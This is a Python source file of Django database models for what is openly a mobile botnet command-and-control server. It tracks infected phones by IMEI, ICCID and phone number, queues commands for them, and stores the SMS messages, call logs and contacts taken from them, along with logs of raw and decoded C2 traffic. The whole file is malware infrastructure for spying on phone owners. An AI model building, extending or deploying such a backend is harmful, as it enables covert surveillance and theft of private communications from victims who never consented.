# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models


class Bot(models.Model):
    hash = models.CharField(max_length=50)
    imei = models.CharField(max_length=30)
    iccid = models.CharField(max_length=30)
    control_field = models.CharField(max_length=30)
    number = models.CharField(max_length=30)
    model = models.CharField(max_length=30)
    os = models.CharField(max_length=30)
    last_online = models.DateTimeField(auto_now=True)
    ipaddr = models.CharField(max_length=20)

    def __unicode__(self):
        return ("bot: %d (%s)" % (self.id, self.number))


class BotCommand(models.Model):
    bot = models.ForeignKey('Bot', on_delete=models.CASCADE)
    command = models.CharField(max_length=20)
    parameters = models.CharField(max_length=4096, default='', blank=True)
    deployed = models.DateTimeField(null=True, blank=True)
    executed = models.BooleanField(default=False)


class SmsData(models.Model):
    bot = models.ForeignKey('Bot', on_delete=models.CASCADE)
    date = models.DateTimeField(auto_now=True)
    message = models.CharField(max_length=1024, default='')
    type = models.IntegerField(default=0)
    address = models.CharField(max_length=20, default='')


class CallLog(models.Model):
    bot = models.ForeignKey('Bot', on_delete=models.CASCADE, null=True)
    date = models.DateTimeField()
    duration = models.IntegerField()
    type = models.IntegerField()
    type_str = models.CharField(max_length=10)
    number = models.CharField(max_length=20)


class Contact(models.Model):
    bot = models.ForeignKey('Bot', on_delete=models.CASCADE)
    display_name = models.CharField(max_length=120)
    data = models.CharField(max_length=80)


class CncLog(models.Model):
    date = models.DateTimeField(auto_now=True)
    ipaddr = models.CharField(max_length=15)
    call = models.CharField(max_length=20)
    raw_msg = models.CharField(max_length=1024, null=True)
    decoded_msg = models.CharField(max_length=1024, null=True)
